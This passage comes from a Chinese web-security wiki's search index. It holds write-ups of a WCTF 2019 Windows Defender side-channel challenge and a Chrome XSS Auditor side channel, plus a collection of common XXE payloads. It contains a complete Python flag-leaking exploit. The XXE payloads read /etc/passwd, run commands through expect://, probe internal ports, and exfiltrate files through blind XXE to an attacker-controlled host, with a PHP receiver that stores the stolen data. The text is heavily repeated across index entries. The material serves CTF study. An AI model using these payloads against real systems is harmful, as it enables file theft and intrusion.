1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests URL = \"http://192.168.122.78\" # changeme def randstr ( n = 8 ): import random import string chars = string . ascii_uppercase + string . ascii_lowercase + string . digits return '' . join ([ random . choice ( chars ) for _ in range ( n )]) def trigger ( c , idx , sess ): import string prefix = randstr () p = prefix + '''<script>f=function(n){eval('X5O!P%@AP[4 \\\\\\\\ PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>''' p = string . Template ( p ) . substitute ({ 'idx' : idx , 'c' : c }) req = sess . post ( URL + '/gyotaku' , data = { 'url' : 'http://127.0.0.1/flag?a=' + p }) return req . json () def leak ( idx , sess ): l , h = 0 , 0x100 while h - l > 1 : m = ( h + l ) // 2 gid = trigger ( m , idx , sess ) if sess . get ( URL + '/gyotaku/' + gid ) . status_code == 500 : l = m else : h = m return chr ( l ) sess = requests . session () sess . post ( URL + '/login' , data = { 'username' : '</body>' + randstr (), 'password' : randstr ()}) data = '' for i in range ( 30 ): data += leak ( i , sess ) print ( data ) \u53c2\u8003meizijiu\u5e08\u5085\u7684\u6587\u7ae0","title":"\u5229\u7528windows defender"},{"location":"web_sec/XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#windows-defender","text":"\u5728WCTF 2019\u4e0a\uff0cTokyoWesterns\u8bbe\u8ba1\u4e86\u4e00\u9053\u9898\u76ee\uff0c\u5728\u8fd9\u9053\u9898\u76ee\u4e2d\uff0c\u9700\u8981\u5229\u7528Windows Defender\u5b8c\u6210\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u672c\u7bc7\u4e3b\u8981\u662f\u5bf9\u8be5\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u5206\u6790\u3002 \u8be5\u9898\u76ee\u7684\u8d5b\u540e\u5206\u4eab\u6587\u6863\u89c1\u94fe\u63a5\uff1a https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf","title":"\u5229\u7528windows defender"},{"location":"web_sec/XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#chrome-xss-auditor","text":"\u8be5\u9898\u76ee\u4e0e35C3 CTF\u4e0a\u7684FileManager\u7684\u5229\u7528\u601d\u8def\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7\u5bf9\u67d0\u79cd\u9632\u5fa1\u673a\u5236\u8fdb\u884c\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6\u6211\u4eec\u539f\u672c\u65e0\u6743\u83b7\u53d6\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u5148\u6765\u56de\u987e\u4e0b\u8fd9\u4e2a\u9898\u76ee\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u5728Chrome Xss Audotor\u4e2d\uff0c\u5f53\u68c0\u6d4b\u5230\u8f93\u5165\u4e0e\u8f93\u51fa\u5230\u811a\u672c\u5185\u5bb9\u91cd\u590d\u65f6\uff0c\u4f1a\u5c06\u9875\u9762\u91cd\u5b9a\u5411\u81f3\u5f02\u5e38\u9875\u9762 chrome-error://chromewebdata/ \u3002 \u4ee5\u4e00\u4e2a\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff1a 1 2 3 4 5 6 7 8 <?php $con = @ $_GET [ \"con\" ]; if ( $con === 'con' ){ echo \"<script>var success='success';</script>\" ; } else { echo \"<script>var fail='fail';</script>\" ; } ?> \u82e5GET\u4f20\u8f93\u7684\u53c2\u6570\u4e3a con=con&<script>var success='success';</script> \uff0cPHP\u7684if\u6d41\u7a0b\u4f1a\u8df3\u8f6c\u81f3\u7b2c\u4e00\u4e2a\u5206\u652f\u4e2d\uff0c\u9875\u9762\u4f1a\u8f93\u51fa\uff1a 1 <script>var success='success';</script> \u8fd9\u4e00\u6bb5\u5185\u5bb9\u4e0e\u6211\u4eecGET\u4f20\u8f93\u7684\u5185\u5bb9\u91cd\u590d\u4e86\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1XSS Auditor\uff0c\u8fdb\u800c\u8df3\u8f6c\u81f3\u5f02\u5e38\u9875\u9762\u3002\u5982\u679cGET\u4f20\u8f93\u7684\u5185\u5bb9\u662f con=cxxx&<script>var success='success';</script> \uff0c\u5219\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\uff0c\u9875\u9762\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\uff1a 1 <script>var fail='fail';</script> \u6b64\u65f6\u9875\u9762\u8f93\u51fa\u4e0eURL\u4e2d\u5185\u5bb9\u4e0d\u91cd\u590d\uff0c\u4e0d\u4f1a\u89e6\u53d1XSS Auditor\u3002\u4ee5\u4e0a\u5c31\u662f\u89e6\u53d1XSS Auditor\u7684\u65b9\u6cd5\u3002 \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5b83\u5462\uff1f \u7531\u4e8e\u8fd9\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u901a\u8fc7GET\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u641c\u7d22\u7684\u529f\u80fd\uff0c\u8fd9\u5c31\u548c\u4e0a\u9762\u4f8b\u5b50\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u5f71\u54cd\u9875\u9762\u8f93\u51fa\u7684\u811a\u672c\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e0d\u65ad\u5730\u4fee\u6539\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c\u4fbf\u80fd\u901a\u8fc7XSS Auditor\u7684\u72b6\u6001\u6765\u5224\u65ad\u9875\u9762\u662f\u5426\u771f\u7684\u5b58\u5728\u8fd9\u4e32\u6587\u672c\u3002","title":"Chrome Xss Auditor"},{"location":"web_sec/XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#windows-defender_1","text":"\u5bf9Windows Defender\u7684\u4fa7\u4fe1\u9053\u5229\u7528\u4e5f\u662f\u7c7b\u4f3c\u7684\u601d\u60f3\u3002","title":"Windows Defender"},{"location":"web_sec/XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#windows-defender_2","text":"\u9996\u5148\u9700\u8981\u660e\u767d\u7684\u662f\uff0cWindows Defender\u7684\u89e6\u53d1\u673a\u5236\u662f\u600e\u6837\u7684\u3002\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u68c0\u67e5\u6587\u4ef6\u5185\u5bb9\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u6570\u636e \u5982\u679c\u5b58\u5728\u6076\u610f\u6570\u636e\uff0c\u62d2\u7edd\u7528\u6237\u8bbf\u95ee \u5c06\u6076\u610f\u6570\u636e\u90e8\u5206\u66ff\u6362\u4e3a\u7a7a\u5b57\u8282 (\u5220\u9664\u6587\u4ef6) \u9996\u5148\u9700\u8981\u627e\u5230\u600e\u6837\u7684\u6076\u610f\u6570\u636e\u80fd\u591f\u89e6\u53d1Windows Defender\uff0c\u8fd9\u91ccEICAR\u6d4b\u8bd5\u6587\u4ef6\u4fbf\u53ef\u4ee5\u505a\u5230\u3002\u6bd4\u5982\u8fd9\u4e00\u6bb5\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H* mpengine.dll\u662fWindows Defender\u7684\u6838\u5fc3DLL\uff0c\u5176\u4e2d\u5305\u542b\u4e86JScript engine\uff0c\u5728JScript engine\u4e2d\u7ee7\u627f\u4e86\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u7d22\u5f15\u64cd\u4f5c\u3001\u6570\u5b66\u64cd\u4f5c\u8fd9\u4e9b\uff0c\u5e76\u4e14\u652f\u6301eval\u51fd\u6570\uff0c\u4f46\u662feval\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u4f20\u5165\u4e0b\u5217js\uff0c\u4fbf\u4f1a\u89e6\u53d1Windows Defender\uff1a 1 eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H*') \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u6784\u601d\u51fa\u653b\u51fb\u65b9\u5f0f\uff0c\u5c06eval\u4e2d\u7684\u7279\u5f81payload\u5206\u5272\u6210\u4e24\u6bb5\uff0c\u6bd4\u5982\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H * \u63a5\u4e0b\u6765\u8981\u601d\u8003\u7684\u5c31\u662f\u5982\u4f55\u5e26\u5165\u8fd9\u4e2a * \u4e86\uff0c\u7531\u4e8e\u9898\u76ee\u4e2d\u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u83b7\u53d6\u5230 /flag \u4e0b\u7684flag\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06flag\u5b57\u7b26\u4e32\u548c * \u7ed3\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u7528\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6570\u7ec4\u7684\u5f62\u5f0f\u4e3a {c:'*'}[c] \uff0c\u540c\u65f6\u6211\u4eec\u8981\u5c06\u5176\u6539\u5199\u4e3a \u4e0eFlag\u4e2d\u5355\u4e2a\u5b57\u7b26\u76f8\u7b49\u65f6\u8fd4\u56de * \uff0c\u6539\u5199\u7684\u7248\u672c\u4e3a\uff1a 1 {c:'*'}[Math.min(c,n)] n\u4e3a\u83b7\u53d6\u7684Flag\u4e2d\u7684\u67d0\u4e00\u4e2a\u5b57\u7b26\u7ecf\u8fc7charCodeAt\u5904\u7406\u7684\u8fd4\u56de\u503c\uff0c\u800cc\u4e3a\u4e00\u4e2a\u4f1a\u4e0d\u65ad\u53d8\u5316\u7684\u503c\u3002charCodeAt\u7684\u8fd4\u56de\u503c\u8303\u56f4\u57280-65535\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u4e8c\u5206\u7684\u65b9\u6cd5\u6765\u8868\u793ac\uff1a 1 2 3 4 5 6 7 8 l = 0; h = 0x100; while h - l > 1: m = ( h + l ) // 2; if(\u89e6\u53d1): l = m else: h = m \u63a5\u4e0b\u6765\u9700\u8981\u601d\u8003\u7684\u5c31\u662f\u89e6\u53d1\u6761\u4ef6\u662f\u4ec0\u4e48\u4e86\u3002\u7531\u4e8e\u5728Windows Defener\u8bc6\u522b\u5230\u6076\u610f\u6570\u636e\u65f6\uff0c\u4f1a\u8fd4\u56de500\u7981\u6b62\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06500\u7684\u72b6\u6001\u4f5c\u4e3aif\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6700\u7ec8\u7684exp\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests URL = \"http://192.168.122.78\" # changeme def randstr ( n = 8 ): import random import string chars = string . ascii_uppercase + string . ascii_lowercase + string . digits return '' . join ([ random . choice ( chars ) for _ in range ( n )]) def trigger ( c , idx , sess ): import string prefix = randstr () p = prefix + '''<script>f=function(n){eval('X5O!P%@AP[4 \\\\\\\\ PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>''' p = string . Template ( p ) . substitute ({ 'idx' : idx , 'c' : c }) req = sess . post ( URL + '/gyotaku' , data = { 'url' : 'http://127.0.0.1/flag?a=' + p }) return req . json () def leak ( idx , sess ): l , h = 0 , 0x100 while h - l > 1 : m = ( h + l ) // 2 gid = trigger ( m , idx , sess ) if sess . get ( URL + '/gyotaku/' + gid ) . status_code == 500 : l = m else : h = m return chr ( l ) sess = requests . session () sess . post ( URL + '/login' , data = { 'username' : '</body>' + randstr (), 'password' : randstr ()}) data = '' for i in range ( 30 ): data += leak ( i , sess ) print ( data ) \u53c2\u8003meizijiu\u5e08\u5085\u7684\u6587\u7ae0","title":"\u89e6\u53d1Windows Defender"},{"location":"web_sec/XXE/PHP\u7ed3\u5408XXE/","text":"PHP\u7ed3\u5408XXE\u5229\u7528 \u00b6 \u6bd4\u5982\u5982\u4e0b\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 <?php $xml =<<< EOF <? xml version = \"1.0\" encoding = \"utf-8\" ?> <!DOCTYPE ANY[ <!ENTITY xxe SYSTEM \"file:///E:/ProgramFiles/phpstudy/PHPTutorial/WWW/audit/flag.txt\"> ]> <x>&xxe;</x> EOF; $xml_class = new SimpleXMLElement($xml, LIBXML_NOENT); var_dump($xml_class); \u6817\u5b50 \u00b6 SUCTF2018 homework\u4e00\u9053\u9898 \u770b\u5230\u53ef\u4ee5\u901a\u8fc7 module \u8c03\u7528\u4e00\u4e2a\u7c7b\uff0c args \u4f5c\u4e3a\u53c2\u6570 \u4e8e\u662f\u52a0\u8f7d\u4e00\u4e2a SimpleXMLElement \u5728\u81ea\u5df1\u7684vps\u4e0a\u6784\u9020obj.xml\u6587\u4ef6\uff1a 1 2 3 4 5 6 7 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE try[ <!ENTITY % int SYSTEM \"http://vps/XXE/evil.xml\"> %int; %all; %send; ]> \u540c\u65f6 evil.xml \u6587\u4ef6\u5982\u4e0b 1 2 <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///home/wwwroot/default/index.php\"> <!ENTITY % all \"<!ENTITY % send SYSTEM 'http://vps/XXE/1.php?file=%file;'> \"> 1.php \u4ee3\u7801 1 2 $content=$_GET['file']; file_put_contents(\"content.txt\",$content); SCTF2019 WP","title":"PHP\u7ed3\u5408XXE\u5229\u7528"},{"location":"web_sec/XXE/PHP\u7ed3\u5408XXE/#phpxxe","text":"\u6bd4\u5982\u5982\u4e0b\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 <?php $xml =<<< EOF <? xml version = \"1.0\" encoding = \"utf-8\" ?> <!DOCTYPE ANY[ <!ENTITY xxe SYSTEM \"file:///E:/ProgramFiles/phpstudy/PHPTutorial/WWW/audit/flag.txt\"> ]> <x>&xxe;</x> EOF; $xml_class = new SimpleXMLElement($xml, LIBXML_NOENT); var_dump($xml_class);","title":"PHP\u7ed3\u5408XXE\u5229\u7528"},{"location":"web_sec/XXE/PHP\u7ed3\u5408XXE/#_1","text":"SUCTF2018 homework\u4e00\u9053\u9898 \u770b\u5230\u53ef\u4ee5\u901a\u8fc7 module \u8c03\u7528\u4e00\u4e2a\u7c7b\uff0c args \u4f5c\u4e3a\u53c2\u6570 \u4e8e\u662f\u52a0\u8f7d\u4e00\u4e2a SimpleXMLElement \u5728\u81ea\u5df1\u7684vps\u4e0a\u6784\u9020obj.xml\u6587\u4ef6\uff1a 1 2 3 4 5 6 7 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE try[ <!ENTITY % int SYSTEM \"http://vps/XXE/evil.xml\"> %int; %all; %send; ]> \u540c\u65f6 evil.xml \u6587\u4ef6\u5982\u4e0b 1 2 <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///home/wwwroot/default/index.php\"> <!ENTITY % all \"<!ENTITY % send SYSTEM 'http://vps/XXE/1.php?file=%file;'> \"> 1.php \u4ee3\u7801 1 2 $content=$_GET['file']; file_put_contents(\"content.txt\",$content); SCTF2019 WP","title":"\u6817\u5b50"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/","text":"XXE\u5e38\u7528payload \u00b6 \u76f4\u63a5\u901a\u8fc7DTD\u5916\u90e8\u5b9e\u4f53\u58f0\u660e \u00b6 1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"file:///etc/passwd\"> ]> <hhh> &f; <hhh> \u901a\u8fc7DTD\u5916\u90e8\u6587\u6863\u5f15\u5165 \u00b6 \u76f2XXE\u5e38\u7528 1 2 3 4 <?xml version=\"1.0\"?> <!DOCTYPE Quan SYSTEM \"https://blog.csdn.net/syy0201/Quan.dtd\"> <hhh> &f; <hhh> \u6b64\u65f6\u7684DTD\u6587\u4ef6\u5185\u5bb9\uff1a 1 <!ENTITY f SYSTEM \"file:///etc/passwd\"> \u901a\u8fc7DTD\u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u5f15\u5165\u5916\u90e8DTD\u6587\u6863\u4e2d\u7684\u5916\u90e8\u5b9e\u4f53\u58f0\u660e \u00b6 1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"https://blog.csdn.net/syy0201/Quan.dtd\"> ]> <hhh> &f; <hhh> \u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u5185\u5bb9 1 <!ENTITY f SYSTEM \"file:///etc/passwd\"> bind XXE \u00b6 \u5728XML\u57fa\u7840\u6709\u63d0\u5230\u8fc7\u53c2\u6570\u5b9e\u4f53\u7684\u5b9a\u4e49,\u4e4b\u540e\u518d\u603b\u7ed3 \u53c2\u6570\u5b9e\u4f53\u662f\u4e00\u79cd\u53ea\u80fd\u5728DTD\u4e2d\u5b9a\u4e49\u548c\u4f7f\u7528\u7684\u5b9e\u4f53\uff0c\u4e00\u822c\u5f15\u7528\u65f6\u4f7f\u7528%\u4f5c\u4e3a\u524d\u7f00\u3002 \u5185\u90e8\u5b9e\u4f53\u662f\u6307\u5728\u4e00\u4e2a\u5b9e\u4f53\u4e2d\u5b9a\u4e49\u7684\u53e6\u4e00\u4e2a\u5b9e\u4f53\uff0c\u4e5f\u5c31\u662f\u5d4c\u5957\u5b9a\u4e49\u3002 1 2 3 4 5 6 7 8 9 <?xml version=\"1.0\"?> <!DOCTYPE Note[ <!ENTITY % file SYSTEM \"file:///C:/1.txt\"> <!ENTITY % remote SYSTEM \"http://\u653b\u51fb\u8005\u4e3b\u673aIP/Quan.xml\"> %remote; %all; ]> <root> &send; </root> Quan.xml \u6587\u4ef6\u5185\u5bb9 1 <!ENTITY % all \"<!ENTITY send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>\"> \u8fd9\u91cc\u6d89\u53ca\u5230\u4e86 file , remote , all , send \u5b9e\u4f53 %remote \u5f15\u5165\u5916\u90e8XML\u6587\u4ef6\u5230\u8fd9\u4e2a XML \u4e2d\uff0c %all \u68c0\u6d4b\u5230send\u5b9e\u4f53\uff0c\u5728 root \u8282\u70b9\u4e2d\u5f15\u5165 send \u5b9e\u4f53\uff0c\u4fbf\u53ef\u5b9e\u73b0\u6570\u636e\u8f6c\u53d1\u3002 \u5229\u7528\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6 \u00b6 \u652f\u6301\u7684\u534f\u8bae\u5982\u4e0b\uff1a \u65f6\u5e38\u56de\u987e\u4e00\u4e0b 1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"file:///etc/passwd\"> ]> <hhh>&f;<hhh> \u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u00b6 1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"expect://id\"> ]> <hhh> &f; <hhh> \u5185\u7f51\u7aef\u53e3\u63a2\u6d4b \u00b6 1 2 3 4 5 6 <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE note[ <!ENTITY Quan SYSTEM \"http://192.168.246.136:80\"> ]> <reset><login> &Quan; </login><secret> Any bugs? </secret></reset> \u6817\u5b50 \u00b6 Ogeek\u6311\u6218\u8d5b \u00b6 payload \u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % expr 'aaa)> <!ENTITY &#x25; file SYSTEM \"file:///FILE_TO_READ\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;> \"> &#x25; eval; &#x25; error; <!ELEMENT aa (bb'> %local_dtd; ]> <message></message> \u53c2\u8003 \u00b6 \u76f2XXE Ogeek\u6311\u6218\u8d5bWP","title":"XXE\u5e38\u7528payload"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#xxepayload","text":"","title":"XXE\u5e38\u7528payload"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#dtd","text":"1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"file:///etc/passwd\"> ]> <hhh> &f; <hhh>","title":"\u76f4\u63a5\u901a\u8fc7DTD\u5916\u90e8\u5b9e\u4f53\u58f0\u660e"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#dtd_1","text":"\u76f2XXE\u5e38\u7528 1 2 3 4 <?xml version=\"1.0\"?> <!DOCTYPE Quan SYSTEM \"https://blog.csdn.net/syy0201/Quan.dtd\"> <hhh> &f; <hhh> \u6b64\u65f6\u7684DTD\u6587\u4ef6\u5185\u5bb9\uff1a 1 <!ENTITY f SYSTEM \"file:///etc/passwd\">","title":"\u901a\u8fc7DTD\u5916\u90e8\u6587\u6863\u5f15\u5165"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#dtddtd","text":"1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"https://blog.csdn.net/syy0201/Quan.dtd\"> ]> <hhh> &f; <hhh> \u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u5185\u5bb9 1 <!ENTITY f SYSTEM \"file:///etc/passwd\">","title":"\u901a\u8fc7DTD\u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u5f15\u5165\u5916\u90e8DTD\u6587\u6863\u4e2d\u7684\u5916\u90e8\u5b9e\u4f53\u58f0\u660e"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#bind-xxe","text":"\u5728XML\u57fa\u7840\u6709\u63d0\u5230\u8fc7\u53c2\u6570\u5b9e\u4f53\u7684\u5b9a\u4e49,\u4e4b\u540e\u518d\u603b\u7ed3 \u53c2\u6570\u5b9e\u4f53\u662f\u4e00\u79cd\u53ea\u80fd\u5728DTD\u4e2d\u5b9a\u4e49\u548c\u4f7f\u7528\u7684\u5b9e\u4f53\uff0c\u4e00\u822c\u5f15\u7528\u65f6\u4f7f\u7528%\u4f5c\u4e3a\u524d\u7f00\u3002 \u5185\u90e8\u5b9e\u4f53\u662f\u6307\u5728\u4e00\u4e2a\u5b9e\u4f53\u4e2d\u5b9a\u4e49\u7684\u53e6\u4e00\u4e2a\u5b9e\u4f53\uff0c\u4e5f\u5c31\u662f\u5d4c\u5957\u5b9a\u4e49\u3002 1 2 3 4 5 6 7 8 9 <?xml version=\"1.0\"?> <!DOCTYPE Note[ <!ENTITY % file SYSTEM \"file:///C:/1.txt\"> <!ENTITY % remote SYSTEM \"http://\u653b\u51fb\u8005\u4e3b\u673aIP/Quan.xml\"> %remote; %all; ]> <root> &send; </root> Quan.xml \u6587\u4ef6\u5185\u5bb9 1 <!ENTITY % all \"<!ENTITY send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>\"> \u8fd9\u91cc\u6d89\u53ca\u5230\u4e86 file , remote , all , send \u5b9e\u4f53 %remote \u5f15\u5165\u5916\u90e8XML\u6587\u4ef6\u5230\u8fd9\u4e2a XML \u4e2d\uff0c %all \u68c0\u6d4b\u5230send\u5b9e\u4f53\uff0c\u5728 root \u8282\u70b9\u4e2d\u5f15\u5165 send \u5b9e\u4f53\uff0c\u4fbf\u53ef\u5b9e\u73b0\u6570\u636e\u8f6c\u53d1\u3002","title":"bind XXE"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#_1","text":"\u652f\u6301\u7684\u534f\u8bae\u5982\u4e0b\uff1a \u65f6\u5e38\u56de\u987e\u4e00\u4e0b 1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"file:///etc/passwd\"> ]> <hhh>&f;<hhh>","title":"\u5229\u7528\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#_2","text":"1 2 3 4 5 6 <?xml version=\"1.0\"?> <!DOCTYPE Quan[ <!ENTITY f SYSTEM \"expect://id\"> ]> <hhh> &f; <hhh>","title":"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#_3","text":"1 2 3 4 5 6 <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE note[ <!ENTITY Quan SYSTEM \"http://192.168.246.136:80\"> ]> <reset><login> &Quan; </login><secret> Any bugs? </secret></reset>","title":"\u5185\u7f51\u7aef\u53e3\u63a2\u6d4b"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#_4","text":"","title":"\u6817\u5b50"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#ogeek","text":"payload \u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % expr 'aaa)> <!ENTITY &#x25; file SYSTEM \"file:///FILE_TO_READ\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;> \"> &#x25; eval; &#x25; error; <!ELEMENT aa (bb'> %local_dtd; ]> <message></message>","title":"Ogeek\u6311\u6218\u8d5b"},{"location":"web_sec/XXE/XXE\u5e38\u7528payload/#_5","text":"\u76f2XXE Ogeek\u6311\u6218\u8d5bWP","title":"\u53c2\u8003"},{"location":"web_sec/advanAudit/","text":"\u5ba1\u8ba1\u8fdb\u9636 \u00b6","title":"\u5ba1\u8ba1\u8fdb\u9636"},{"location":"web_sec/advanAudit/#_1","text":"","title":"\u5ba1\u8ba1\u8fdb\u9636"},{"location":"web_sec/advanAudit/java\u5ba1\u8ba1/","text":"Jdk7u21 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eGadget\u539f\u7406 Jdk7u21 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eGadget\u539f\u7406 - Exploit\u7684\u5c0f\u7ad9~ - CSDN\u535a\u5ba2 \u5ba1\u8ba1mybatis\u7684sql\u6ce8\u5165 \u5ba1\u8ba1mybatis\u7684sql\u6ce8\u5165 | xd_xd's blog JAVA\u5b89\u5168\u7f16\u7801\u4e0e\u4ee3\u7801\u5ba1\u8ba1 JavaID/JAVA\u5b89\u5168\u7f16\u7801\u4e0e\u4ee3\u7801\u5ba1\u8ba1.md at master \u00b7 Cryin/JavaID \u00b7... \u653b\u51fbJavaWeb\u5e94\u75281-9\uff08JavaWeb\u5b89\u5168\u7cfb\u5217\uff09 [\u653b\u51fbJavaWeb\u5e94\u75281-9 JavaWeb\u5b89\u5168\u7cfb\u5217] - \u5148\u77e5\u793e\u533a SSRF in JAVA SSRF in JAVA - JoyChou Java\u4ee3\u7801\u5ba1\u8ba1\u8fde\u8f7d\u4e4bXSS Java\u4ee3\u7801\u5ba1\u8ba1\u8fde\u8f7d\u4e4b\u2014XSS_\u767d\u5e3d\u5b50\u5206\u4eab\u6280\u672f/\u601d\u8def_i\u6625\u79cb\u793e\u533a-\u5206\u4eab\u4f60\u7684\u6280\u672f\uff0c\u4e3a\u5b89\u5168\u52a0\u70b9\u6e29\u5ea6 Java\u4ee3\u7801\u5ba1\u8ba1\u8fde\u8f7d\u4e4bSQL\u6ce8\u5165 Java\u4ee3\u7801\u5ba1\u8ba1\u8fde\u8f7d\u4e4b\u2014SQL\u6ce8\u5165_\u767d\u5e3d\u5b50\u5206\u4eab\u6280\u672f/\u601d\u8def_i\u6625\u79cb\u793e\u533a-\u5206\u4eab\u4f60\u7684\u6280\u672f\uff0c\u4e3a\u5b89\u5168\u52a0\u70b9\u6e29\u5ea6 Java\u6846\u67b6\u5b89\u5168 Java\u6846\u67b6\u5b89\u5168 - Exploit\u7684\u5c0f\u7ad9~ - CSDN\u535a\u5ba2 JAVA\u4ee3\u7801\u5ba1\u8ba1\u7684\u4e00\u4e9bTips(\u9644\u811a\u672c) JAVA\u4ee3\u7801\u5ba1\u8ba1\u7684\u4e00\u4e9bTips(\u9644\u811a\u672c) - \u5148\u77e5\u793e\u533a Lib\u4e4b\u8fc7\uff1fJava\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u901a\u7528\u5229\u7528\u5206\u6790 http://wiki.ioin.in/url/4mY \u4e0a\u767e\u4e2aJava\u6709\u5173\u7684\u6587\u7ae0 Sec-News \u5b89\u5168\u6587\u6458 14\u4e2aSpring\u6709\u5173\u7684Java\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 Sec-News \u5b89\u5168\u6587\u6458 17\u4e2aStruts\u6709\u5173\u7684Java\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 Sec-News \u5b89\u5168\u6587\u6458 